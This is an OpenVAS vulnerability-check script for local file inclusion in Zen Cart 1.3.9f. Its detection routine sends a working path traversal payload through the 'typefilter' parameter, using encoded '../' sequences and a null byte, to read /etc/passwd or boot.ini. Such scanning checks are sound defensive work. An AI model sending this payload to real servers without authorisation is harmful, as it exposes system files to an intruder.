###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zen_cart_43628.nasl 5388 2017-02-21 15:13:30Z teissa $
#
# Zen Cart Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Zen Cart is prone to multiple input-validation vulnerabilities because
it fails to adequately sanitize user-supplied input. These
vulnerabilities include local file-include, SQL-injection, and HTML-
injection issues.

Exploiting these issues can allow attacker-supplied HTML and script
code to run in the context of the affected browser, allowing attackers
to steal cookie-based authentication credentials, view local files
within the context of the webserver, compromise the application,
access or modify data, or exploit latent vulnerabilities in the
underlying database. Other attacks may also be possible.

Zen Cart v1.3.9f is vulnerable; other versions may also be affected.";

tag_solution = "Updates are available. Please see the reference for more details.";

if (description)
{
 script_id(100840);
 script_version("$Revision: 5388 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-21 16:13:30 +0100 (Tue, 21 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-10-04 14:08:22 +0200 (Mon, 04 Oct 2010)");
 script_bugtraq_id(43628);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Zen Cart Multiple Input Validation Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43628");
 script_xref(name : "URL" , value : "http://www.zen-cart.com/");
 script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4967.php");
 script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4966.php");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/shop","/cart","/zen-cart",cgi_dirs());
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/index.php?typefilter=",crap(data:"..%2f",length:9*5),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  } 
}

exit(0);

